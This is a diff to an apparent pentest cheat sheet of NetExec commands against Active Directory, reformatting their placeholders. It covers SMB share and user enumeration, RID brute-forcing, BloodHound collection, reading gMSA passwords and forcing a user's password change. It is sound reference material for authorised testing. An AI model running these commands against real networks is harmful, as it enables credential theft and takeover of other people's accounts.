@@ -40,19 +40,14 @@ unset TARGET
 
 ## nxc - smb enumeration authenticated
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
-Note: <Creds_Options> can be -p (password), -H (NT hash), or -k -p (Kerberos ticket). Always quote CREDS variable.
+Note: Use Shift+O to select authentication method
 
 ```bash
 mkdir -p loot/smb/authenticated
-IP=<IP>
-USER=<Username>
-CREDS="<Creds_Options|-p|-H|-k -p>"
-PASS=<Password>
-nxc smb "$IP" -u "$USER" $CREDS "$PASS" --smb-timeout 10 --shares > $(pwd)/loot/smb/authenticated/shares.txt
-nxc smb "$IP" -u "$USER" $CREDS "$PASS" --smb-timeout 10 --rid-brute > $(pwd)/loot/smb/authenticated/rid_brute.txt
-nxc smb "$IP" -u "$USER" $CREDS "$PASS" --smb-timeout 10 --users > $(pwd)/loot/smb/authenticated/users.txt
+nxc smb <IP> -u <Username> <Creds_Options|-p|-H|-k -p> <Password> --smb-timeout 10 --shares > $(pwd)/loot/smb/authenticated/shares.txt
+nxc smb <IP> -u <Username> <Creds_Options|-p|-H|-k -p> <Password> --smb-timeout 10 --rid-brute > $(pwd)/loot/smb/authenticated/rid_brute.txt
+nxc smb <IP> -u <Username> <Creds_Options|-p|-H|-k -p> <Password> --smb-timeout 10 --users > $(pwd)/loot/smb/authenticated/users.txt
 echo "All information saved to loot/smb/authenticated/"
-unset IP USER CREDS PASS
 ```
 
 ## nxc - enumerate host
@@ -92,16 +87,15 @@ nxc smb <IP> -u 'a' -p '' --shares
 
 ## nxc - collect/ingest bloodhound
 #plateform/linux #target/remote #port/389 #protocol/ldap #cat/RECON
-Note: <Creds_Options> can be -p (password), -H (NT hash), or -k -p (Kerberos ticket)
+Note: Use Shift+O to select authentication method
 
 ```bash
-IP=<IP>
-nxc ldap "$IP" -u <Username> <Creds_Options|-p|-H|-k -p> <Password> --bloodhound -c All --dns-server $IP
+nxc ldap <IP> -u <Username> <Creds_Options|-p|-H|-k -p> <Password> --bloodhound -c All --dns-server <IP>
 ```
 
 ## nxc - ReadGMSAPassword
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION
-Note: <Creds_Options> can be -p (password), -H (NT hash), or -k -p (Kerberos ticket)
+Note: Use Shift+O to select authentication method
 
 ```bash
 nxc ldap <IP> -u <Username> <Creds_Options|-p|-H|-k -p> <Password> --gmsa
@@ -109,7 +103,7 @@ nxc ldap <IP> -u <Username> <Creds_Options|-p|-H|-k -p> <Password> --gmsa
 
 ## nxc - ForceChangePassword
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION
-Note: <Creds_Options> can be -p (password), -H (NT hash), or -k -p (Kerberos ticket)
+Note: Use Shift+O to select authentication method
 
 ```bash
 nxc smb <IP> -u <Username> <Creds_Options|-p|-H|-k -p> <Password> -M change-password -o USER=<Target_Username> NEWPASS=<New_Password>
